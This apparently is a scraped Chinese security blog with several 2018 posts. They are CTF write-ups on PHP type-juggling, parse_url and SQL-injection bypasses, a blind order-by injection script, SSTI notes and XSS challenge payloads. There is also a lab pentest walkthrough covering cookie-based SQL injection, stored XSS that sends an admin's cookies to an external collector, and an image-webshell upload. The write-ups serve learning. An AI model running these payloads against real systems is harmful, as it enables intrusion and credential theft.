urllib.quote(r.content[917:927])</span><br><span class="line">print ans</span><br></pre></td></tr></table></figure></p>
<h2 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h2><p><img src="../images/17/3.png" alt=""><br>这里要求我们传入的time值为数字类型，并且要介于（60 <em> 60 </em> 24 <em> 30 </em> 2）和（60 <em> 60 </em> 24 <em> 30 </em> 3）之间，满足条件后，网页会把time转化为int型然后沉睡time秒后回显flag，这里肯定是不可能等两到三个月的时间来拿flag的。关键点在于is_numeric()函数，这个函数可以检测数字和数字字符串，不仅可以检测十进制，也能检测十六进制，并且科学记数法也能检测出。但是有一个细节可以注意，网页是把time转化为了int型变量，既然有了is_nemeric()函数，为什么还需要用int类型转换呢？<br>这里就要利用int类型转化的缺陷了，int在转换字符型时，碰到字母就会停下来，也就是说<strong>(int)0e213</strong>等于0，这个在MD5弱类型比较时有着很强的作用。结合两者，我们可以想到用科学记数法来绕过。time赋值为6e6，等待六秒就行了。  </p>
<h2 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h2><p><img src="../images/17/4.png" alt=""><br>这题目是一个陷阱，它直接给出了登入成功会跳转的地址，所以我们是没必要去登入的，成功绕过登入实在是太过困难了一点，不过值得注意的是，直接访问index.php会跳转回来，我们可以抓包拿flag。<br><img src="../images/17/5.png" alt="">  </p>
<h2 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h2><p><img src="../images/17/6.png" alt=""><br>读题，题目的大致意思是把url?后的字符串以&amp;作为分隔符分开，然后以=作为分隔符，前者为key，后者为value，然后要求变量do_you_want_flag=yes，但是key和value的值不能为do_you_want_flag和yes。<br>这里就存在一个矛盾了，既然url不能出现do_you_want_flag和yes那么我们如何通过get的方式得到do_you_want_flag变量值为yes呢？这里题目关键在于这里:<br><img src="../images/17/7.png" alt=""><br><img src="../images/17/8.png" alt=""><br>对于不合格的url会返回false，所以我们可以构造这个函数认为不合格但是服务器可以解析的url，例如这个:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://urlfiltering.solveme.peng.kr//?do_you_want_flag=yes</span><br></pre></td></tr></table></figure></p>
<p>这里就可以成功绕过得到flag了。  </p>
<h2 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h2><p><img src="../images/17/9.png" alt=""><br>这题目比较简单，sha加密弱类型比较用数组就可以轻松绕过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2</span><br></pre></td></tr></table></figure></p>
<h2 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h2><p><img src="../images/17/10.png" alt=""><br>审题，题目要求我们不能输入username变量的值，只能通过chr(value)一个一个拼接成username变量的值，但是value不能在32-127之间，而我们的字符ascii码却在这之中，这题绕过方式很简单，关键在于chr()这个函数，chr()函数如果在处理大于256的值时，它会mod256直到参数小于256为止再进行操作，password读取/secret.passwd就能得到，所以payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://array2string.solveme.peng.kr/index.php?value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</span><br></pre></td></tr></table></figure></p>
<h2 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h2><p><img src="../images/17/11.png" alt=""><br>题目的意思是让我们输入一个url参数的值，但是呢，有几点要求：<br>第一是不能有类似_或者|和空格之类的字符。<br>第二必须要有http或者https开头，并且域名为题目的域名，也就是<a href="http://givemealink.solveme.peng.kr/。" target="_blank" rel="noopener">http://givemealink.solveme.peng.kr/。</a><br>第三是需要有/plz_give_me这个路径。<br>现在难点有两个，第一个是在_被禁止使用的时候如何绕过检测url路径中的/plz_give_me，这个问题查阅parse_url这个函数就可以解决，在解析url时，如果碰到无效字符，例如%10，%11等，就会使用_来替代这个无效字符。<br>第二个问题就是如何拿到flag了，这个问题的解决方法就是用到@的黑魔法了，如果按照正常的构造：<a href="http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr/plz%10give%10me" target="_blank" rel="noopener">http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr/plz%10give%10me</a><br>那服务器就会去访问givemealink.solveme.peng.kr/flag这个地址，我们没办法看到flag(除非我们是这个服务器的拥有者)，所以我们得让我们自己的服务器接收到这个才行。  </p>
<p><img src="../images/17/12.png" alt=""><br><img src="../images/17/13.png" alt=""><br>如果我们使用了@，那么parse_url解析url时的host就是@后面的域名了，所以加上一个@再加自己服务器的ip就可以接收到flag了。  </p>
<h2 id="Give-me-a-link2"><a href="#Give-me-a-link2" class="headerlink" title="Give me a link2"></a>Give me a link2</h2><p><img src="../images/17/14.png" alt=""><br>题目和上一个差不多的要求，就是多了一点：host只能是localhost，127.xx.xx.xx，或者一个任意字符串加端口，也就是说这里不能使用xx.xx.xx.xx或者是xxxx.xxx的地址，满足条件后建立连接带flag访问其服务器的端口，如果访问成功则会返回Okay字样，但是如何绕过限制来使得这题目向我们服务器发生请求呢?<br><img src="../images/17/15.png" alt=""><br>这里可以使用ip2long函数，这个函数会把ip转化为字符串形式，这里就可以绕过检测并且使得网页访问我们的服务器，构造?url=<a href="http://xxxxxx:xxxx/plz%10give%10me，网页直接回显了flag，要是没回显监听端口也能得到flag。" target="_blank" rel="noopener">http://xxxxxx:xxxx/plz%10give%10me，网页直接回显了flag，要是没回显监听端口也能得到flag。</a></p>
<h2 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h2><p><img src="../images/17/16.png" alt=""><br>题目要求我们传入say变量的值，要求长度要小于20，并且只有say变量中有give_me_the_flag字符串才能得到flag，但是呢，在得到flag之前有一个替换的过程，只要匹配到带有flag的字符串就会被替换为后面一串奇怪的字符，这样一被替换那根本不可能得到flag，所以我们需要尝试绕过。<br>正则匹配时，.是不会匹配换行符的，在解析完换行符后不在同一行的话是匹配不到的。所以使用%0a即可绕过。<br>PS:这题目想到了onethink那道题目，那道题目就是通过%0a换行之后绕过了//，把shell写入了文件。  </p>
<h2 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h2><p>这题目一打开就和其他画风不太对，f12发现这是js混淆，先解密再说，脚本是从一叶飘零大佬那里借鉴来的。<br><img src="../images/17/17.png" alt=""><br>解密发现了一堆可疑的数字，用脚本处理下直接出答案了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">text = &apos;...&apos;  #那串字符串</span><br><span class="line">text = text.replace(&apos;&quot;&apos;,&apos;&apos;)</span><br><span class="line">text = text.split(&apos;,&apos;)</span><br><span class="line">final = &quot;&quot;</span><br><span class="line">for i in range(0,len(text)):</span><br><span class="line">    temp = &quot;&quot;</span><br><span class="line">    temp = text[i]</span><br><span class="line">    temp = temp.replace(&apos;+&apos;,&apos;&apos;)</span><br><span class="line">    temp = chr(int(temp))</span><br><span class="line">    final = final + temp</span><br><span class="line">print final</span><br></pre></td></tr></table></figure></p>
<h2 id="Lax-CAPTCHA"><a href="#Lax-CAPTCHA" class="headerlink" title="Lax CAPTCHA"></a>Lax CAPTCHA</h2><p><img src="../images/17/18.png" alt=""><br>这题目我没做出来，分享一下思路吧。<br>题目要求我们先用generate触发生成图片码的应用，再让我们在3秒内输入验证码得到flag，人工拼手速是不行的，十五个字母太过长了。所以我想回溯到生成图片的最开始去获取answer，但是我发现一旦解码就成了乱码，无法进一步回溯，gg。<br>第二种思路就是用脚本识别验证码然后传参，但是这种方法目前实现太过困难了，通过像素点从数据库中一一比对这种技术我还做不到，所以gg。<br>第三种就是去预测生成的验证码了，mt_rand也是一个伪随机生成器，但是我预测失败，gg。  </p>
<h2 id="Anti-SQLi"><a href="#Anti-SQLi" class="headerlink" title="Anti SQLi"></a>Anti SQLi</h2><p><img src="../images/17/19.png" alt=""><br>这题目就是一道注入题，给了源码而已，有点像实验吧的一些注入题。题目一开始过滤了一堆东西，与其去看正则还不如用字典扫一下，再结合来看。<br>首先是闭合符’被过滤了，这里可以考虑看看编码情况，如果是gbk编码可以构造出’，但是这里不存在这种方法。但是接着后看的时候发现了一点，发现转义符\并没有过滤完善，过滤\是需要四个\来完成的，所以这里可以用\闭合掉一个’造成闭合符逃逸，接着就是如何注释的问题了，上面仔细观察发现过滤了–加上后面是空格符，换行符之类的，但是忽略了一个不可见字符，所以这里可以使用–%10来注释掉，最后一个问题就是需要查询出31337这个数据，要知道如果使用<strong>SELECT * FROM <code>antisqli</code> WHERE <code>id</code>=’{$id}’ AND <code>pw</code>=md5(‘{$pw}’)</strong>这个查询语句是查不出的，这里就必须要用到联合查询语句，但是order by和union select 被过滤了，order by倒是可以使用一个一个猜测来完成，但是union select要怎么办呢？可以在中间加个all，只是这个整体被过滤我们只要改变这个就行了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,1,1 from antisqli --%10</span><br></pre></td></tr></table></figure></p>
<p>回显hello,1<br>所以把1都改为31337就行了</p>
<h2 id="Name-check"><a href="#Name-check" class="headerlink" title="Name check"></a>Name check</h2><p><img src="../images/17/20.png" alt=""><br>先看得到flag的条件，需要row[0]，row[1]，row[2]，row[3]四个相加等于4，也就是说他们四个要为true才行。那接着分析四个语句。<br>第一个条件要求字符串开头要为a。<br>第二个条件要求d字符不能在开头。<br>第三个条件要求字符要为a_m__的格式。<br>第四个条件字符后两位为in。<br>结合起来看就是要求name为admin，但是题目会过滤admin以及一些连接符，这里值得注意的是sqlite不像mysql一样使用+来进行连接，而是使用||，所以使用ad’||’min即可绕过。  </p>
<h2 id="Super-secure-hash"><a href="#Super-secure-hash" class="headerlink" title="Super secure hash"></a>Super secure hash</h2><p><img src="../images/17/21.png" alt=""><br>这题目没做出来，最后只得到crc32加密后的密码:<br><img src="../images/17/22.png" alt=""><br>这题目思路很明确了，就是通过爆破去找到这个加密前的密码。在比较密码的时候清一色都是使用强类型比较根本不可能使用布尔值来绕过，所以只能去找密码，但是crc32在6位以上的密码又是基本不可能爆破出的，所以卡死在这了，gg。  </p>
<h3 id="最后几道题目知识点有点多，还是单独写比较好，毕竟太快写完有点知识不牢固。还是太懒了啊…-学习动力匮乏，希望找点一点积极的东西来促进学习吧。"><a href="#最后几道题目知识点有点多，还是单独写比较好，毕竟太快写完有点知识不牢固。还是太懒了啊…-学习动力匮乏，希望找点一点积极的东西来促进学习吧。" class="headerlink" title="最后几道题目知识点有点多，还是单独写比较好，毕竟太快写完有点知识不牢固。还是太懒了啊…..学习动力匮乏，希望找点一点积极的东西来促进学习吧。"></a>最后几道题目知识点有点多，还是单独写比较好，毕竟太快写完有点知识不牢固。还是太懒了啊…..学习动力匮乏，希望找点一点积极的东西来促进学习吧。</h3>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/08/02/关于代码审计的一些绕过方式/" data-id="cjmni3xuj0014ywveibfpvhcs" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-近期比赛学习到的一些知识" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/07/22/近期比赛学习到的一些知识/" class="article-date">
  <time class="post-time" datetime="2018-07-22T01:33:46.000Z" itemprop="datePublished">
    <span class="post-month">7月</span><br/>
    <span class="post-day">22</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/22/近期比赛学习到的一些知识/">近期比赛学习到的一些知识</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h2><p>这是QCTF的一道题目，算是比较有新意的一道题目(对我来说….)。<br><img src="../images/16/1.png" alt=""><br>题目要求很简单啊，大致意思就是让你买7个数字，中了大概一千万就能买到flag了。<br>一开始先扫一发目录，果然发现了有.git源码泄露。先把源码下下来吧。<br><img src="../images/16/2.png" alt=""><br>打开源码进行分析。<br>关于大致流程是这样的，首先要求我们登入，只需要输入一个用户名，网页自动生成一个账户，其实这里账户是什么都无所谓，根本不会写入数据库进行交互，无论哪个账户的初始金额都只有20美元，这里就有两个思路了。<br>我第一个想法就是看看在数据交互的时候能否更改我账户的金额，翻了翻源码发现这个不同一般网页，这个网页应用了Ajax技术，金额是在前端进行交互，没办法去抓包更改(可能是我技术太垃圾了)。所以思来想去，pass了这个思路。<br>第二个想法呢，是经过大师傅的指导才有的思路。这个题目既然说了买彩票，那么题目的做法一定和彩票有联系，不会无缘无故的设计一个博彩系统来迷惑我们，所以呢，我们需要搏一搏。<br>单纯的去买一堆彩票能中上千万是不现实的，所以肯定需要一些特殊的办法来发家致富。因此要关注这是如何验证彩票中奖情况的，所以重点锁定在了api.php里面的函数。<br><img src="../images/16/3.png" alt=""><br>这里可以看出彩票的数字生成是实实在在不可预测的，这个根据实时内存生成的函数基本无法预测。所以只有从如何比较的方向入手了。<br><img src="../images/16/4.png" alt=""><br>验证时分别获取我们输入的数字以及随机生成数字进行比较，本题关键就是在这，这里并没有用强类型比较，而是用了弱类型比较。在弱类型比较里面，非零数在与true比较时是返回true的，所以到这里思路就很明确了，只要在我们提交购买彩票时把我们数据改成7个true就行了，但是在做题目的时候发现了一个问题，json数据怎么改。经过post，用py发包无果后才发现，这用burp就可以了啊。。。。。。<br><img src="../images/16/5.png" alt=""><br>把数字改成true就行了，记得在读取数据的时候是以数组的形式，记得把numbers改为数组形式，要不然会以字符串形式读取字符，这就无法匹配了。<br><strong>PS:布尔型变量在很多验证都能起到绕过匹配的作用，多加以应用。</strong>  </p>
<h2 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h2><h3 id="SSTI-模板注入"><a href="#SSTI-模板注入" class="headerlink" title="SSTI-模板注入"></a>SSTI-模板注入</h3><p>这也是根据一道题目所学来的知识点，虽然没有做出来，但是这里还是值得记录一下。题目解析就不写了，只是写写一些要点。<br>对于我来说，目前接触到了很多由于攻击者进行恶意输入导致网页信息泄露，被攻击者获取权限的注入手段。比如最常见的sql注入，xss，代码注入，以及命令注入等。SSTI–服务端模板注入还是第一次接触。<br>SSTI注入主要发生在用户请求的地方，这个和xss有点相似，网页把用户查询的信息未经过严格的处理直接回显到了页面，根据不同的服务端模板，如果我们调用模板中的函数，就能在特定情况下利用其读取文件或者写入shell等操作。<br>具体详细可以参考这一篇文章:<a href="http://www.freebuf.com/vuls/83999.html。" target="_blank" rel="noopener">http://www.freebuf.com/vuls/83999.html。</a>  </p>
<h3 id="flask模板中request"><a href="#flask模板中request" class="headerlink" title="flask模板中request"></a>flask模板中request</h3><p>这道题目就是使用python的flask模板，在flask中前端需要发送不同的请求及各种带参数的方式，比如GET方法在URL后面带参数和POST在BODY带参数，有时候又是POST的表单提交方式，这个时候就需要从request提取参数。<br>下面是request可使用的属性，主要归纳一些常用的。<br><strong>form</strong>:一个从POST和PUT请求解析的 MultiDict（一键多值字典）。<br><strong>args</strong>:MultiDict，要操作 URL （如 ?key=value ）中提交的参数可以使用 args 属性:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.arg.key?key=value</span><br></pre></td></tr></table></figure></p>
<p><strong>values</strong>:CombinedMultiDict，内容是form和args。可以使用values替代form和args。<br><strong>headers</strong>:请求头，字典类型。<br><strong>data</strong>:包含了请求的数据，并转换为字符串，除非是一个Flask无法处理的mimetype。<br><strong>method</strong>:请求方法，比如POST、GET。<br><strong>PS:在过滤了某些关键词时可以使用args属性绕过。</strong><br><strong>通过调用py类中函数对于的索引来读取或者写入文件</strong></p>
<h2 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h2><p>只能说自己实力还是太弱了吧，碰到sql注入题目都要花很久才能做出来。这一次是一道关于order by注入的一道题目，题目提示了select flag from flag，只要爆破出字段就行了。<br>题目有提供id，name，price三个排序方式，对于mysql来说，排序方式转化为二进制，那么在使用id排序时，id=1对应的就是0001，id=2对于的就是0010，而假对应的是0000，也就是说不改变排序方式，而真对应的是0001，在与2位异或时，2变成了0011，3却变成了0001，所以这里我们可以使用位异或结合布尔型来更改排序方式。<br>贴下我的垃圾脚本吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">list = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_abcdefghijklmnopqrstuvwxyz0123456789&quot;</span><br><span class="line">r1 = &quot;&quot;</span><br><span class="line">text = &quot;&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,27):</span><br><span class="line">    for j in list:</span><br><span class="line">        url = &quot;http://101.71.29.5:10004/?order=id^(substr((select flag from flag),%d,1)=&apos;%s&apos;) &amp;button=submit&quot;%(i,j)</span><br><span class="line">        r1 = requests.get(url)</span><br><span class="line">        text = r1.content</span><br><span class="line">        if text[949] == &apos;3&apos;:</span><br><span class="line">            print j</span><br><span class="line">            flag = flag + j</span><br><span class="line">            break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/07/22/近期比赛学习到的一些知识/" data-id="cjmni3xvl001qywvedryw53ts" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-一次靶场的注入实战" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/07/15/一次靶场的注入实战/" class="article-date">
  <time class="post-time" datetime="2018-07-15T00:48:35.000Z" itemprop="datePublished">
    <span class="post-month">7月</span><br/>
    <span class="post-day">15</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/15/一次靶场的注入实战/">记一次靶场的渗透实战</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>之前几天在学linux以及docker的一些基本操作，昨天打一次ctf比赛发现自己水平还是那么菜，好在郁离歌师傅一句”太急了”点醒了我。然后之前靠着一手py搞到了一个靶场，现在刚刚好用到练练手。这一次的题目就是从这里面来的。</p>
<h1 id="注入拿密码"><a href="#注入拿密码" class="headerlink" title="注入拿密码"></a>注入拿密码</h1><h3 id="初步观察"><a href="#初步观察" class="headerlink" title="初步观察"></a>初步观察</h3><p>打开网站，发现信息量挺多的，不过不急慢慢找突破点。<br>点开首页，然后在接着点开其他链接发现这是一个asp动态网页。<br><img src="../images/15/1.png" alt=""><br><img src="../images/15/2.png" alt=""><br>既然这题目要我们通过注入，那就关注与数据库交互方面的内容。</p>
<h3 id="找到注入点"><a href="#找到注入点" class="headerlink" title="找到注入点"></a>找到注入点</h3><p>在新闻界面发现了有与数据库交互的内容，一个查询界面通过id号来查询新闻内容。<br><img src="../images/15/3.png" alt=""><br>这里我稍微尝试了一下，试着测试了一下，在get传参的时候有waf拦截了一些关键词查询，这里有两种思路可以选择，第一是通过一些技巧来绕过过滤，不过我在测试的时候发现了一个问题，这里连<strong>‘’</strong>都过滤了，其他可用函数也无法构造完整语句来查询。所以基本可以考虑第二种方式，去找其他注入点，凡是与数据库交互的都是可以注入的。<br>这里我抓了个包，方便我们找出其他交互的点。<br><img src="../images/15/4.png" alt=""><br>抓包之后发现了还有一个cookie可以进行交互，这里可以尝试一下。<br><strong>PS:其实这里我也没想到能这样，源码是通过request来获取id参数值，asp也一般都是通过request来传参，所以我们可以通过cookie来给id进行赋值，而cookie一般是很少过滤的。</strong></p>
<h3 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h3><p>通过cookies managers+插件改cookie直接访问<a href="http://120.203.13.111:8001/shownews.asp，而不通过get的方式来进行传参。测试是什么类型的注入。值得注意的是，我在测试的时候发现cookie里面的+是被替换为了空格，所以在输入的时候要注意一下。" target="_blank" rel="noopener">http://120.203.13.111:8001/shownews.asp，而不通过get的方式来进行传参。测试是什么类型的注入。值得注意的是，我在测试的时候发现cookie里面的+是被替换为了空格，所以在输入的时候要注意一下。</a><br>输入<strong>id=172-1</strong>的时候发现，它跳到了171的界面，那这个是数字型注入没得跑了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=171 order by 10 回显正常</span><br><span class="line">id=171 order by 11 回显不正常</span><br></pre></td></tr></table></figure></p>
<p>接着判断回显位数，不过这里需要猜列名，一般的话会有什么admin，admins，user等等，可以试着猜解一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=171 union select 1,2,3,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure></p>
<p>这里显示出了回显位。<br><img src="../images/15/5.png" alt=""><br>接着爆出username,password。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=171 union select 1，username,password,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure></p>
<p><img src="../images/15/6.png" alt=""></p>
<h3 id="找后台"><a href="#找后台" class="headerlink" title="找后台"></a>找后台</h3><p>现在用户名和密码到手，可以试着去找后台进行登入了。<br>尝试了一下发现后台为120.203.13.111:8001/admin/，然后输入密码和用户就行了，密码记得解个md5。<br><img src="../images/15/7.png" alt=""></p>
<h1 id="CSRF进后台"><a href="#CSRF进后台" class="headerlink" title="CSRF进后台"></a>CSRF进后台</h1><p>上面这个后台一眼就能看出是假的，所以应该还有真正的后台。<br>用工具扫了扫，发现一堆目录。<br><img src="../images/15/8.png" alt=""><br>既然admin不行，那可以试试admin123<br><img src="../images/15/9.png" alt=""><br>登入进去发现不太对。具体如下：<br><img src="../images/15/10.png" alt=""><br><img src="../images/15/11.png" alt=""><br>分析一下源码可以大致理解这里需要我们更改Referer，也就是从哪里传来的数据包，所以抓包改referer。<br>所以访问我们所要访问的页面，然后进行抓包。<br><img src="../images/15/12.png" alt=""><br>修改http头，注意端口要一致，否则会出现无法响应的情况。<br><img src="../images/15/13.png" alt=""><br><strong>PS:还有一种方法是通过构造本地的链接去访问<a href="http://127.0.0.1/admin123/sysadmin_view.asp" target="_blank" rel="noopener">http://127.0.0.1/admin123/sysadmin_view.asp</a></strong></p>
<h1 id="XSS拿cookies"><a href="#XSS拿cookies" class="headerlink" title="XSS拿cookies"></a>XSS拿cookies</h1><p>在测试的时候，我们在找注入点的时候发现了还有一个留言板的页面。<br><img src="../images/15/14.png" alt=""><br>这里可以实验一下我们之前在xss挑战赛练习的骚操作。<br>测试的时候发现这里没有过滤任何东西，所以不用考虑绕过的一些技巧。<br>管理员会定时的来查看留言，那么我们只要构造一个导向链接把管理员的cookies导入到我们的接收平台就行了，这里就用网上提供的xss接收平台吧。<br>一键生成Payload，虽然自己也不太会写这些代码。不过能用就行了。<br><img src="../images/15/15.png" alt=""><br>直接把payload丢到留言区等管理员查看就好。<br><img src="../images/15/16.png" alt=""><br>cookie值到手。  </p>
<h1 id="传马拿shell"><a href="#传马拿shell" class="headerlink" title="传马拿shell"></a>传马拿shell</h1><p>接下来就是找上传文件的地方了。这个ip不仅仅提供了8001端口，还提供了8002端口，8001两个后台都去过了所以接着去8002的后台看看。登入网址为：<a href="http://120.203.13.111:8002/admin/login.asp" target="_blank" rel="noopener">http://120.203.13.111:8002/admin/login.asp</a><br>修改cookie就能进后台了。<br><img src="../images/15/17.png" alt=""><br>找到上传文件的地方。<br><img src="../images/15/18.png" alt=""><br>制作图片马。<br><img src="../images/15/19.png" alt=""><br>菜刀连接的时候发现并不能成功连接，错误提示了IIS6.0无法解析，具体原因我百度了一番。不成功是因为图片马无法被解析<br>IIS6.0是可以使用;，我又试着写了一个<strong>1.asp;1.jpg</strong>的小马上传，但是被检测出了无法上传。这里会检测是否是真的图片。百度的时候还发现了一个IIS6.0的解析缺陷，也就是类似cer，asa，cdx是被忽略没被过滤的，那我们可以试试把图片马后缀名改为cer试试。<br><img src="../images/15/20.png" alt=""><br>成功连接，找敏感文件就行了，这里直接找到flag.txt文件。  </p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>提权后续就不写了，对应的exp百度自行即可，说到底我自己也不会只是单纯的利用人家的工具而已，所以提权就不再往下写了。</p>
<h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>这算是一次完整的流程吧，经过这一次半实战的演练可以尝试去拿一些其他的站点了。<br>持之以恒！！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjmni3xuo0016ywve0ojv2fz0" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-xss挑战赛的Payload-下" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/07/13/xss挑战赛的Payload-下/" class="article-date">
  <time class="post-time" datetime="2018-07-12T18:33:05.000Z" itemprop="datePublished">
    <span class="post-month">7月</span><br/>
    <span class="post-day">13</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/13/xss挑战赛的Payload-下/">xss挑战赛的Payload(下)</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p><img src="../images/14/10.png" alt=""><br>这题目和第十题很类似，而且t_ref的内容竟然时第十题的payload，仔细想想，我们就是通过构造这个才跳转到的第十一题，而且ref立马就能想到referer这个，所以抓包更改referer属性然后点击就行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer: &quot; type=&quot;button&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure></p>
<p><img src="../images/14/11.png" alt=""></p>
<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p><img src="../images/14/12.png" alt=""><br>这题目的注入点在http头的浏览器模式下，抓包改浏览器格式和上一题一样。</p>
<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>这题目和上面题目类似就是把cookies里面user的内容改了就行了。</p>
<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>这题目没搞懂要做什么，查了wp说是这题目貌似有问题，所以暂且跳过。</p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>加载起来特别慢，也没搞懂是网络问题还是这个页面本身就这样。<br><img src="../images/14/13.png" alt=""><br>根据提示这里需要用到AngularJS，听大黄说这是js的一个框架，有着特定的语法，基本的js语法也能够适用，但是需要遵守一定规则。具体用法和规则如下：<br><img src="../images/14/14.png" alt=""><br>这里查阅了大手子的资料发现对外部html还有特殊的要求：<br><img src="../images/14/15.png" alt=""><br>所以大致结合起来看，我们可以通过访问ng-include来执行我们的外部文件，所以可以考虑通过level1作为跳板来实现，由于script的标签没办法使用只能用事件来触发xss<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level1.php?name=&lt;img src=s onerror=alert(1)&gt;&apos;</span><br></pre></td></tr></table></figure></p>
